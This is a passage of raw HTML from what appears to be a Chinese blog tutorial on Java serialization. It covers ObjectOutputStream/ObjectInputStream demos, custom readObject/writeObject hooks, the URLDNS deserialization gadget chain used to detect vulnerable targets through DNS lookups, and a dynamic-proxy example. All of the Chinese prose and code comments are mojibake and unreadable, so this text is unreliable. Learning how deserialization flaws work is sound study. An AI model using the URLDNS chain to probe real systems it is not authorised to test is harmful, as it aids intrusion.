class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Creator: yz</span></span><br><span class="line"><span class="comment"> * Date: 2019/12/15</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String username;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> String email;</span><br><span class="line"></span><br><span class="line"><span class="comment">// çœå»get/setæ–¹æ³•....</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"><span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">// åˆ›å»ºDeserializationTestç±»ï¼Œå¹¶ç±»è®¾ç½®å±æ€§å€¼</span></span><br><span class="line"><span class="type">DeserializationTest</span> <span class="variable">t</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DeserializationTest</span>();</span><br><span class="line">t.setUsername(<span class="string">&quot;yz&quot;</span>);</span><br><span class="line">t.setEmail(<span class="string">&quot;admin@javaweb.org&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ›å»ºJavaå¯¹è±¡åºåˆ—åŒ–è¾“å‡ºæµå¯¹è±¡</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line"></span><br><span class="line"><span class="comment">// åºåˆ—åŒ–DeserializationTestç±»</span></span><br><span class="line">out.writeObject(t);</span><br><span class="line">out.flush();</span><br><span class="line">out.close();</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ‰“å°DeserializationTestç±»åºåˆ—åŒ–ä»¥åçš„å­—èŠ‚æ•°ç»„ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶å­˜å‚¨åˆ°æ–‡ä»¶ä¸­æˆ–è€…é€šè¿‡Socketå‘é€åˆ°è¿œç¨‹æœåŠ¡åœ°å€</span></span><br><span class="line">System.out.println(<span class="string">&quot;DeserializationTestç±»åºåˆ—åŒ–åçš„å­—èŠ‚æ•°ç»„:&quot;</span> + Arrays.toString(baos.toByteArray()));</span><br><span class="line"></span><br><span class="line"><span class="comment">// åˆ©ç”¨DeserializationTestç±»ç”Ÿæˆçš„äºŒè¿›åˆ¶æ•°ç»„åˆ›å»ºäºŒè¿›åˆ¶è¾“å…¥æµå¯¹è±¡ç”¨äºååºåˆ—åŒ–æ“ä½œ</span></span><br><span class="line"><span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(baos.toByteArray());</span><br><span class="line"></span><br><span class="line"><span class="comment">// é€šè¿‡ååºåˆ—åŒ–è¾“å…¥æµ(bais),åˆ›å»ºJavaå¯¹è±¡è¾“å…¥æµ(ObjectInputStream)å¯¹è±¡</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line"></span><br><span class="line"><span class="comment">//ååºåˆ—åŒ–è·å–å¯¹è±¡</span></span><br><span class="line"><span class="type">DeserializationTest</span> <span class="variable">test</span> <span class="operator">=</span> (DeserializationTest) in.readObject();</span><br><span class="line">System.out.println(<span class="string">&quot;ç”¨æˆ·å:&quot;</span> + test.getUsername() + <span class="string">&quot;,é‚®ç®±:&quot;</span> + test.getEmail());</span><br><span class="line"></span><br><span class="line"><span class="comment">// å…³é—­ObjectInputStreamè¾“å…¥æµ</span></span><br><span class="line">in.close();</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125; <span class="keyword">catch</span> (ClassNotFoundException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æ‰§è¡Œç»“æœ</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">DeserializationTestç±»åºåˆ—åŒ–åçš„å­—èŠ‚æ•°ç»„:[-84, -19, 0, 5, 115, 114, 0, 44, 99, 111, 109, 46, 97, 110, 98, 97, 105, 46, 115, 101, 99, 46, 115, 101, 114, 105, 97, 108, 105, 122, 101, 115, 46, 68, 101, 115, 101, 114, 105, 97, 108, 105, 122, 97, 116, 105, 111, 110, 84, 101, 115, 116, 74, 36, 49, 16, -110, 39, 13, 76, 2, 0, 2, 76, 0, 5, 101, 109, 97, 105, 108, 116, 0, 18, 76, 106, 97, 118, 97, 47, 108, 97, 110, 103, 47, 83, 116, 114, 105, 110, 103, 59, 76, 0, 8, 117, 115, 101, 114, 110, 97, 109, 101, 113, 0, 126, 0, 1, 120, 112, 116, 0, 17, 97, 100, 109, 105, 110, 64, 106, 97, 118, 97, 119, 101, 98, 46, 111, 114, 103, 116, 0, 2, 121, 122]</span><br><span class="line">ç”¨æˆ·å:yz,é‚®ç®±:admin@javaweb.org</span><br></pre></td></tr></table></figure></div><blockquote><p>æ ¸å¿ƒé€»è¾‘å…¶å®å°±æ˜¯ä½¿ç”¨<code>ObjectOutputStream</code>ç±»çš„<code>writeObject</code>æ–¹æ³•åºåˆ—åŒ–<code>DeserializationTest</code>ç±»ï¼Œä½¿ç”¨<code>ObjectInputStream</code>ç±»çš„<code>readObject</code>æ–¹æ³•ååºåˆ—åŒ–<code>DeserializationTest</code>ç±»è€Œå·²ã€‚</p></blockquote><p>ç®€åŒ–åçš„ä»£ç </p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// åºåˆ—åŒ–DeserializationTestç±»</span></span><br><span class="line"><span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">out.writeObject(t);</span><br><span class="line"></span><br><span class="line"><span class="comment">// ååºåˆ—åŒ–è¾“å…¥æµæ•°æ®ä¸ºDeserializationTestå¯¹è±¡</span></span><br><span class="line"><span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line"><span class="type">DeserializationTest</span> <span class="variable">test</span> <span class="operator">=</span> (DeserializationTest) in.readObject();</span><br></pre></td></tr></table></figure></div><p><code>ObjectOutputStream</code>åºåˆ—åŒ–ç±»å¯¹è±¡çš„ä¸»è¦æµç¨‹æ˜¯é¦–å…ˆåˆ¤æ–­åºåˆ—åŒ–çš„ç±»æ˜¯å¦é‡å†™äº†<code>writeObject</code>æ–¹æ³•ï¼Œå¦‚æœé‡å†™äº†å°±è°ƒç”¨åºåˆ—åŒ–å¯¹è±¡è‡ªèº«çš„<code>writeObject</code>æ–¹æ³•åºåˆ—åŒ–ï¼Œåºåˆ—åŒ–æ—¶ä¼šå…ˆå†™å…¥ç±»åä¿¡æ¯ï¼Œå…¶æ¬¡æ˜¯å†™å…¥æˆå‘˜å˜é‡ä¿¡æ¯(é€šè¿‡åå°„è·å–æ‰€æœ‰ä¸åŒ…å«è¢«<code>transient</code>ä¿®é¥°çš„å˜é‡å’Œå€¼)ã€‚</p><h3 id="è‡ªå®šä¹‰åºåˆ—åŒ–-writeObject-å’Œååºåˆ—åŒ–-readObject"><a href="#è‡ªå®šä¹‰åºåˆ—åŒ–-writeObject-å’Œååºåˆ—åŒ–-readObject" class="headerlink" title="è‡ªå®šä¹‰åºåˆ—åŒ–(writeObject)å’Œååºåˆ—åŒ–(readObject)"></a>è‡ªå®šä¹‰åºåˆ—åŒ–(writeObject)å’Œååºåˆ—åŒ–(readObject)</h3><p>å®ç°äº†<code>java.io.Serializable</code>æ¥å£çš„ç±»ï¼Œè¿˜å¯ä»¥å®šä¹‰å¦‚ä¸‹æ–¹æ³•(<code>ååºåˆ—åŒ–é­”æœ¯æ–¹æ³•</code>)ï¼Œè¿™äº›æ–¹æ³•å°†ä¼šåœ¨ç±»åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–è¿‡ç¨‹ä¸­è°ƒç”¨ï¼š</p><ol><li><strong><code>private void writeObject(ObjectOutputStream oos)</code>,è‡ªå®šä¹‰åºåˆ—åŒ–ã€‚</strong></li><li><strong><code>private void readObject(ObjectInputStream ois)</code>ï¼Œè‡ªå®šä¹‰ååºåˆ—åŒ–ã€‚</strong></li><li><code>private void readObjectNoData()</code>ã€‚</li><li><code>protected Object writeReplace()</code>ï¼Œå†™å…¥æ—¶æ›¿æ¢å¯¹è±¡ã€‚</li><li><code>protected Object readResolve()</code>ã€‚</li></ol><p>åºåˆ—åŒ–æ—¶å¯è‡ªå®šä¹‰çš„æ–¹æ³•ç¤ºä¾‹ä»£ç ï¼š</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DeserializationTest</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è‡ªå®šä¹‰ååºåˆ—åŒ–ç±»å¯¹è±¡</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> ois ååºåˆ—åŒ–è¾“å…¥æµå¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException            IOå¼‚å¸¸</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> ClassNotFoundException ç±»æœªæ‰¾åˆ°å¼‚å¸¸</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;readObject...&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// è°ƒç”¨ObjectInputStreamé»˜è®¤ååºåˆ—åŒ–æ–¹æ³•</span></span><br><span class="line">ois.defaultReadObject();</span><br><span class="line"></span><br><span class="line"><span class="comment">// çœå»è°ƒç”¨è‡ªå®šä¹‰ååºåˆ—åŒ–é€»è¾‘...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * è‡ªå®šä¹‰åºåˆ—åŒ–ç±»å¯¹è±¡</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> oos åºåˆ—åŒ–è¾“å‡ºæµå¯¹è±¡</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException IOå¼‚å¸¸</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">writeObject</span><span class="params">(ObjectOutputStream oos)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">oos.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">System.out.println(<span class="string">&quot;writeObject...&quot;</span>);</span><br><span class="line"><span class="comment">// çœå»è°ƒç”¨è‡ªå®šä¹‰åºåˆ—åŒ–é€»è¾‘...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObjectNoData</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;readObjectNoData...&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å†™å…¥æ—¶æ›¿æ¢å¯¹è±¡</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> æ›¿æ¢åçš„å¯¹è±¡</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">writeReplace</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;writeReplace....&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> Object <span class="title function_">readResolve</span><span class="params">()</span> &#123;</span><br><span class="line">System.out.println(<span class="string">&quot;readResolve....&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><blockquote><p>å½“æˆ‘ä»¬å¯¹<code>DeserializationTest</code>ç±»è¿›è¡Œåºåˆ—åŒ–æ“ä½œæ—¶ï¼Œä¼šè‡ªåŠ¨è°ƒç”¨(åå°„è°ƒç”¨)è¯¥ç±»çš„<code>writeObject(ObjectOutputStream oos)</code>æ–¹æ³•,å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–æ“ä½œæ—¶ä¹Ÿä¼šè‡ªåŠ¨è°ƒç”¨è¯¥ç±»çš„<code>readObject(ObjectInputStream)</code>æ–¹æ³•ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨å¾…<strong>åºåˆ—åŒ–æˆ–ååºåˆ—åŒ–çš„ç±»ä¸­å®šä¹‰<code>readObject</code>å’Œ<code>writeObject</code>æ–¹æ³•ï¼Œæ¥å®ç°è‡ªå®šä¹‰çš„åºåˆ—åŒ–å’Œååºåˆ—åŒ–æ“ä½œ</strong>ï¼Œå½“ç„¶å‰ææ˜¯ï¼Œè¢«åºåˆ—åŒ–çš„ç±»å¿…é¡»æœ‰æ­¤æ–¹æ³•ï¼Œå¹¶ä¸”æ–¹æ³•çš„ä¿®é¥°ç¬¦å¿…é¡»æ˜¯<code>private</code>ã€‚</p></blockquote><h3 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h3><p><code>URLDNS</code>æ˜¯ä¸€ä¸ªéå¸¸ç»å…¸çš„ååºåˆ—åŒ–é“¾ã€‚é€‚åˆç”¨äºæ£€æµ‹ååºåˆ—åŒ–æ¼æ´ï¼Œä½†ä¸èƒ½æ”»å‡»</p><ul><li>ä½¿ç”¨Javaå†…ç½®çš„ç±»æ„é€ ï¼Œå¯¹ç¬¬ä¸‰æ–¹åº“æ²¡æœ‰ä¾èµ–</li><li>åœ¨â½¬æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé€šè¿‡DNSè¯·æ±‚å¾—çŸ¥æ˜¯å¦å­˜åœ¨ååºï¦œåŒ–ï¥æ´</li></ul><p>è°ƒç”¨é“¾</p><p>HashMap.readObject() -&gt; HashMap.hash() -&gt; java.net.URL.hashCode() -&gt; URLStreamHandler.hashCode() -&gt; URLStreamHandler.getHostAddress() -&gt; InetAddress.getByName()</p><blockquote><blockquote><p>public static InetAddress getByName(String host) throws UnknownHostException<br>ç¡®å®šä¸»æœºåç§°çš„IPåœ°å€ã€‚<br>ä¸»æœºåç§°å¯ä»¥æ˜¯æœºå™¨åç§°ï¼Œä¾‹å¦‚â€œ java.sun.com â€æˆ–å…¶IPåœ°å€çš„æ–‡æœ¬è¡¨ç¤ºã€‚ å¦‚æœæä¾›äº†æ–‡å­—IPåœ°å€ï¼Œåˆ™åªä¼šæ£€æŸ¥åœ°å€æ ¼å¼çš„æœ‰æ•ˆæ€§ã€‚</p></blockquote><p><code>java.util.HashMap</code> å®ç°äº† <code>Serializable</code> æ¥å£ï¼Œé‡å†™äº† <code>readObject</code>, åœ¨ååºåˆ—åŒ–æ—¶ä¼šè°ƒç”¨ <code>hash</code> å‡½æ•°è®¡ç®— key çš„ hashCode(éœ€è¦å…ˆè®¾ç½®æˆ-1). è€Œ <code>java.net.URL</code> çš„ <code>hashCode</code> åœ¨è®¡ç®—æ—¶ä¼šè°ƒç”¨ <code>getHostAddress</code> æ¥è§£æåŸŸåï¼Œä»è€Œå‘å‡º DNS è¯·æ±‚ã€‚</p></blockquote><blockquote><p>åœ¨ç›®æ ‡æ²¡æœ‰å›æ˜¾çš„æ—¶å€™,å¯ä»¥ç¡®å®šç›®æ ‡ç³»ç»Ÿä¸Šæ˜¯å¦å­˜åœ¨å¯æ§çš„ <code>readObject()</code> æ–¹æ³•</p></blockquote><h2 id="JavaåŠ¨æ€ä»£ç†"><a href="#JavaåŠ¨æ€ä»£ç†" class="headerlink" title="JavaåŠ¨æ€ä»£ç†"></a>JavaåŠ¨æ€ä»£ç†</h2><p>åŠ¨æ€ä»£ç†æ¯”è¾ƒå¸¸è§çš„ç”¨å¤„å°±æ˜¯ï¼š<strong>åœ¨ä¸ä¿®æ”¹ç±»çš„æºç çš„æƒ…å†µä¸‹,é€šè¿‡ä»£ç†çš„æ–¹å¼ä¸ºç±»çš„æ–¹æ³•æä¾›æ›´å¤šçš„åŠŸèƒ½</strong></p><p>ä¸¾ä¸ªä¾‹å­æ¥è¯´ï¼ˆè¿™ä¸ªä¾‹å­åœ¨å¼€å‘ä¸­å¾ˆå¸¸è§ï¼‰ï¼šæˆ‘çš„å¼€å‘ä»¬å®ç°äº†ä¸šåŠ¡éƒ¨åˆ†çš„æ‰€æœ‰ä»£ç ï¼Œå¿½ç„¶æˆ‘æœŸæœ›åœ¨è¿™äº›ä¸šåŠ¡ä»£ç ä¸­å¤šæ·»åŠ æ—¥å¿—è®°å½•åŠŸèƒ½çš„æ—¶å€™ï¼Œä¸€ä¸ªä¸€ä¸ªç±»å»æ·»åŠ ä»£ç å°±ä¼šéå¸¸éº»çƒ¦ï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬å°±èƒ½é€šè¿‡åŠ¨æ€ä»£ç†çš„æ–¹å¼å¯¹æœŸå¾…æ·»åŠ æ—¥å¿—çš„ç±»è¿›è¡Œä»£ç†ã€‚</p><p>çœ‹ä¸€ä¸ªç®€å•çš„demoï¼š</p><p>Workæ¥å£éœ€è¦å®ç°workå‡½æ•°</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Work</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">work</span><span class="params">()</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>Teacherç±»å®ç°äº†Workæ¥å£</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Teacher</span> <span class="keyword">implements</span> <span class="title class_">Work</span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">work</span><span class="params">()</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;my work is teach students&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Teacher&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>WorkHandlerç”¨æ¥å¤„ç†è¢«ä»£ç†å¯¹è±¡ï¼Œå®ƒå¿…é¡»ç»§æ‰¿InvocationHandleræ¥å£ï¼Œå¹¶å®ç°invokeæ–¹æ³•</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">WorkHandler</span> <span class="keyword">implements</span> <span class="title class_">InvocationHandler</span>&#123;</span><br><span class="line">    <span class="comment">//ä»£ç†ç±»ä¸­çš„çœŸå®å¯¹è±¡</span></span><br><span class="line">    <span class="keyword">private</span> Object obj;</span><br><span class="line">    <span class="comment">//æ„é€ å‡½æ•°ï¼Œç»™æˆ‘ä»¬çš„çœŸå®å¯¹è±¡èµ‹å€¼</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">WorkHandler</span><span class="params">(Object obj)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.obj = obj;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">invoke</span><span class="params">(Object proxy, Method method, Object[] args)</span> <span class="keyword">throws</span> Throwable &#123;</span><br><span class="line">        <span class="comment">//åœ¨çœŸå®çš„å¯¹è±¡æ‰§è¡Œä¹‹å‰æˆ‘ä»¬å¯ä»¥æ·»åŠ è‡ªå·±çš„æ“ä½œ</span></span><br><span class="line">        System.out.println(<span class="string">&quot;before invokeã€‚ã€‚ã€‚&quot;</span>);</span><br><span class="line">        <span class="comment">//javaçš„åå°„åŠŸèƒ½ï¼Œç”¨æ¥è°ƒç”¨objå¯¹è±¡çš„methodæ–¹æ³•ï¼Œä¼ å…¥å‚æ•°ä¸ºargs</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">invoke</span> <span class="operator">=</span> method.invoke(obj, args);</span><br><span class="line">        <span class="comment">//åœ¨çœŸå®çš„å¯¹è±¡æ‰§è¡Œä¹‹åæˆ‘ä»¬å¯ä»¥æ·»åŠ è‡ªå·±çš„æ“ä½œ</span></span><br><span class="line">        System.out.println(<span class="string">&quot;after invokeã€‚ã€‚ã€‚&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> invoke;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>åœ¨Testç±»ä¸­é€šè¿‡Proxy.newProxyInstanceè¿›è¡ŒåŠ¨æ€ä»£ç†ï¼Œè¿™æ ·å½“æˆ‘ä»¬è°ƒç”¨ä»£ç†å¯¹è±¡proxyå¯¹è±¡çš„workæ–¹æ³•çš„æ—¶å€™ï¼Œ<strong>å®é™…ä¸Šè°ƒç”¨çš„æ˜¯WorkHandlerçš„invokeæ–¹æ³•</strong>ã€‚</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="comment">//è¦ä»£ç†çš„çœŸå®å¯¹è±¡</span></span><br><span class="line">        <span class="type">Work</span> <span class="variable">people</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Teacher</span>();</span><br><span class="line">        <span class="comment">//ä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†ç¨‹åºï¼Œæˆ‘ä»¬å°†è¦ä»£ç†çš„çœŸå®å¯¹è±¡ä¼ å…¥ä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†çš„æ„é€ å‡½æ•°ä¸­ï¼Œæœ€ç»ˆä»£ç†å¯¹è±¡çš„è°ƒç”¨å¤„ç†ç¨‹åºä¼šè°ƒç”¨çœŸå®å¯¹è±¡çš„æ–¹æ³•</span></span><br><span class="line">        <span class="type">InvocationHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WorkHandler</span>(people);</span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * é€šè¿‡Proxyç±»çš„newProxyInstanceæ–¹æ³•åˆ›å»ºä»£ç†å¯¹è±¡ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹æ–¹æ³•ä¸­çš„å‚æ•°</span></span><br><span class="line"><span class="comment">         * ç¬¬ä¸€ä¸ªå‚æ•°ï¼špeople.getClass().getClassLoader()ï¼Œä½¿ç”¨handlerå¯¹è±¡çš„classloaderå¯¹è±¡æ¥åŠ è½½æˆ‘ä»¬çš„ä»£ç†å¯¹è±¡</span></span><br><span class="line"><span class="comment">         * ç¬¬äºŒä¸ªå‚æ•°ï¼špeople.getClass().getInterfaces()ï¼Œè¿™é‡Œä¸ºä»£ç†ç±»æä¾›çš„æ¥å£æ˜¯çœŸå®å¯¹è±¡å®ç°çš„æ¥å£ï¼Œè¿™æ ·ä»£ç†å¯¹è±¡å°±èƒ½åƒçœŸå®å¯¹è±¡ä¸€æ ·è°ƒç”¨æ¥å£ä¸­çš„æ‰€æœ‰æ–¹æ³•</span></span><br><span class="line"><span class="comment">         * ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šhandlerï¼Œæˆ‘ä»¬å°†ä»£ç†å¯¹è±¡å…³è”åˆ°ä¸Šé¢çš„InvocationHandlerå¯¹è±¡ä¸Š</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="type">Work</span> <span class="variable">proxy</span> <span class="operator">=</span> (Work)Proxy.newProxyInstance(handler.getClass().getClassLoader(), people.getClass().getInterfaces(), handler);</span><br><span class="line">        System.out.println(proxy.work());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>çœ‹ä¸€ä¸‹è¾“å‡ºç»“æœï¼Œæˆ‘ä»¬å†æ²¡æœ‰æ”¹å˜Teacherç±»çš„å‰æä¸‹é€šè¿‡ä»£ç†Workæ¥å£ï¼Œå®ç°äº†workå‡½æ•°è°ƒç”¨çš„é‡å†™ã€‚</p><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">before invokeã€‚ã€‚ã€‚</span><br><span class="line">my work is teach students</span><br><span class="line">after invokeã€‚ã€‚ã€‚</span><br><span class="line">Teacher</span><br></pre></td></tr></table></figure></div><h2 id="javassiståŠ¨æ€ç¼–ç¨‹"><a href="#javassiståŠ¨æ€ç¼–ç¨‹" class="headerlink" 